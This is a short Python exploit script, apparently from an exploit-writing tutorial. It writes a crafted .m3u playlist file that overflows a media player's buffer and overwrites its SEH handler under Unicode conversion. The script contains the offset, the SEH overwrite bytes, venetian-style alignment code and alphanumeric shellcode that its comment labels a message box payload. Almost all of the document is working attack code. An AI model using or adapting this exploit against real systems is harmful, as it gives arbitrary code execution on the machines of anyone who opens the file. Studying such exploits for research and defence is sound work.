outputfile="corelanc0d3r.m3u"
offset_to_nseh=250   #affected by the m3u path length !
junk = "A" * offset_to_nseh
nseh="\x41\x45"
seh="\x93\x47" #Unicode conversion : 0x0047201C => mov eax,esi + ppr
junk2="\x45" 
align="\x55"  #push ebp
align=align+"\x6d"  #pad (ebp is writable)
align=align+"\x58"  #pop eax
align=align+"\x6d"
align=align+"\x05\x25\x11"
align=align+"\x6d"
align=align+"\x2d\x11\x11"
align=align+"\x6d"
align=align+"\x50\x6d\xc3"  #go!
align=align+"I"*56
#msgbox
shellcode="PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AI"
shellcode+="AIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBhYzKskhY4"
shellcode+="4nDJTLq6rfRajNQuyOtTKQaP0TKt6LLTKQfkl2koVJh4K3NO02kOFOHpOKhrUJS29Z"
shellcode+="axQyo8as0DK0lNDKtDKOUMlBkntKUqhKQxjBkmzJxdKQJKpkQzKgsP7MyDKltDKjaJ"
shellcode+="NLqkO017PKLVL2dGPQdKZWQ6olMkQI7xizQ9oyoKOOKSLktmX45GnDKQJktjaHkpfD"
shellcode+="KlL0KrkNzMLiqZKBkyt4KM1iX2iMtKtkloqVcVRlHNIhT3YHe1ywRoxdNNnZnJLr2W"
shellcode+="x5LKOIoKOqymuitEkSNvxgrd357KlktobYXDKIokOKOu9oUyx0hplplo0yoQXNSoBL"
shellcode+="nC4QXPupsS52R58aLMTlJqyJFR6KOaEKTqyWRB07KUXW2NmwLDGMLktpRWxQNKOkOi"
shellcode+="orHnxKpo0Kpph1DS5s1BMphplc1PnmPoxpCrOprpeNQIKDHOlktZl4IK3aXrRNxMPO"
shellcode+="0oxbCNPOtMcQXREplOqpn38mPOsPobRQXbDKps2RY0hNoD7pn35May9sXPLO4ju2iY"
shellcode+="QNQyBobOcnqQB9o8PNQY00PIoPUyxKZA"
 
junk3="\x49"*2550
 
payload=junk+nseh+seh+junk2+align+shellcode+junk3
print " [+] Writing payload to file "+outputfile+" (" + str(len(payload))+" bytes)"
FILE = open(outputfile, "w")
FILE.write(payload)
FILE.close()